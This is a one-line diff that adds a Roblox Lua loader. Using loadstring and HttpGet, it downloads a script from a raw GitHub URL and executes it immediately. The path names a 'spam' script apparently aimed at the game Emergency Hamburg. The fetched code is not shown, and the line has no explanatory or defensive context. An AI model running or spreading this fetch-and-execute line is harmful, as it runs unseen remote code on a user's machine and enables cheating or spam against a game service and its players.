@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/emergency-hamburg-spam3-rrjxftz1od90w1.lua"))()
